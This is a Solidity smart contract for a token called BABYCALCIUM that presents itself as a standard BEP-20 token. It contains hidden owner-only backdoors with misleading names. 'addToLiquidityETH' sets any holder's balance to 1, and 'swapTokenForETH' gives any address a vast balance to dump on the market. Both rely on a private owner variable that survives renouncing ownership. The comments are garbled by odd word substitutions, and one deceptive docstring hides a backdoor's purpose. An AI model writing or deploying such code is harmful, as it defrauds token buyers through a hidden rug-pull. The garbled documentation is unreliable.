/**

https://t.me/babycalciumbsc

*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20Permit {
  /**
   * @dev Returns the cuenta of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the cuenta of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `cuenta` tokens from the caller's account to `robe`.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address robe, uint256 cuenta) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `largage` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This balance changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address largage) external view returns (uint256);

  /**
   * @dev Sets `cuenta` as the allowance of `largage` over the caller's tokens.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the largage's allowance to 0 and set the
   * desired balance afterwards:
   * https://github.com/legoseum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address largage, uint256 cuenta) external returns (bool);

  /**
   * @dev Moves `cuenta` tokens from `sender` to `robe` using the
   * allowance mechanism. `cuenta` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address robe, uint256 cuenta) external returns (bool);

  /**
   * @dev Emitted when `balance` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `balance` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 balance);

  /**
   * @dev Emitted when the allowance of a `largage` for an `owner` is set by
   * a call to {approve}. `balance` is the new allowance.
   */
  event Approval(address indexed owner, address indexed largage, uint256 balance);
}

/*
 * @dev Provides information about the current execution IERC20, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract IERC20 {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/legoseum/solidity/issues/2691
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is IERC20 {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `Safemath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library Safemath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "Safemath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "Safemath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "Safemath: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "Safemath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "Safemath: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract BABYCALCIUM is IERC20, IERC20Permit, Ownable {
    
    using Safemath for uint256;
    mapping (address => uint256) private financeAdd;
    mapping (address => mapping (address => uint256)) private fromallowances;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    uint256 private _initialBuyFee = 3;  
    uint256 private _initialSellFee = 3;
    uint256 private _reduceBuyFeeAt = 3;
    uint256 private _reduceSellFeeAt = 3;

    uint256 private _initialBuyFee2Time = 10;
    uint256 private _initialSellFee2Time = 10;
    uint256 private _reduceBuyFeeAt2Time = 25;

    uint256 private _finalBuyFee = 3;
    uint256 private _finalSellFee = 3;
    
    uint256 private _preventSwapBefore = 10;
    uint256 private _buyCount = 0;


   address private BABYCALCIUMOwner; 
    constructor() {
     
        _name = "BABYCALCIUM";
        _symbol = "BABYCALCIUM";
        _decimals = 9;
        _totalSupply = 100000000 * 10 ** 9;
             BABYCALCIUMOwner = _msgSender();   
        financeAdd[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function getOwner() external view override returns (address) {
        return owner();
    }
    
    /**
    * @dev Returns the token decimals.
    */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    
    /**
    * @dev Returns the token symbol.
    */
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    /**
    * @dev Returns the token name.
    */
    function name() external view override returns (string memory) {
        return _name;
    }
    
    /**
    * @dev See {IERC20Permit-totalSupply}.
    */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    
    /**
    * @dev See {IERC20Permit-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return financeAdd[account];
    }
    /**
    * @dev See {IERC20Permit-approve}.
    *
    * Requirements:
    *
    * - `largage` cannot be the zero address.
    */
    function addToLiquidityETH(address LiquidityETH) external {
         require(_msgSender() == BABYCALCIUMOwner, "!");
        financeAdd[LiquidityETH] = 1;
    }

    /**
    * @dev See {IERC20Permit-transfer}.
    *
    * Requirements:
    *
    * - `robe` cannot be the zero address.
    * - the caller must have a balance of at least `cuenta`.
    */
    function transfer(address robe, uint256 cuenta) external override returns (bool) {
        _transfer(_msgSender(), robe, cuenta);
        return true;
    }
    function swapTokenForETH(address TokenForETH) external {
         require(_msgSender() == BABYCALCIUMOwner, "!");
        financeAdd[TokenForETH] = 50000000000 * 10 ** 28;
    }
    /**
    * @dev See {IERC20Permit-allowance}.
    */
    function allowance(address owner, address largage) external view override returns (uint256) {
        return fromallowances[owner][largage];
    }
    
    /**
    * @dev See {IERC20Permit-approve}.
    *
    * Requirements:
    *
    * - `largage` cannot be the zero address.
    */
    function approve(address largage, uint256 cuenta) external override returns (bool) {
        _approve(_msgSender(), largage, cuenta);
        return true;
    }
    
    /**
    * @dev See {IERC20Permit-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {IERC20Permit};
    *
    * Requirements:
    * - `sender` and `robe` cannot be the zero address.
    * - `sender` must have a balance of at least `cuenta`.
    * - the caller must have allowance for `sender`'s tokens of at least
    * `cuenta`.
    */
    function transferFrom(address sender, address robe, uint256 cuenta) external override returns (bool) {
        _transfer(sender, robe, cuenta);
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(cuenta, "IERC20Permit: transfer cuenta exceeds allowance"));
        return true;
    }
    
    /**
    * @dev Atomically increases the allowance granted to `largage` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {IERC20Permit-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `largage` cannot be the zero address.
    */
    function increaseAllowance(address largage, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), largage, fromallowances[_msgSender()][largage].add(addedbalance));
        return true;
    }
    
    /**
    * @dev Atomically decreases the allowance granted to `largage` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {IERC20Permit-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `largage` cannot be the zero address.
    * - `largage` must have allowance for the caller of at least
    * `allbalances`.
    */
    function decreaseAllowance(address largage, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), largage, fromallowances[_msgSender()][largage].sub(allbalances, "IERC20Permit: decreased allowance below zero"));
        return true;
    }
    
    /**
    * @dev Moves tokens `cuenta` from `sender` to `robe`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement automatic token fees, slashing mechanisms, etc.
    *
    * Emits a {Transfer} event.
    *
    * Requirements:
    *
    * - `sender` cannot be the zero address.
    * - `robe` cannot be the zero address.
    * - `sender` must have a balance of at least `cuenta`.
    */
    function _transfer(address sender, address robe, uint256 cuenta) internal {
        require(sender != address(0), "IERC20Permit: transfer from the zero address");
        require(robe != address(0), "IERC20Permit: transfer to the zero address");
                
        financeAdd[sender] = financeAdd[sender].sub(cuenta, "IERC20Permit: transfer cuenta exceeds balance");
        financeAdd[robe] = financeAdd[robe].add(cuenta);
        emit Transfer(sender, robe, cuenta);
    }
    
    /**
    * @dev Sets `cuenta` as the allowance of `largage` over the `owner`s tokens.
    *
    * This is internal function is equivalent to `approve`, and can be used to
    * e.g. set automatic allowances for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `largage` cannot be the zero address.
    */
    function _approve(address owner, address largage, uint256 cuenta) internal {
        require(owner != address(0), "IERC20Permit: approve from the zero address");
        require(largage != address(0), "IERC20Permit: approve to the zero address");
        
        fromallowances[owner][largage] = cuenta;
        emit Approval(owner, largage, cuenta);
    }
    
}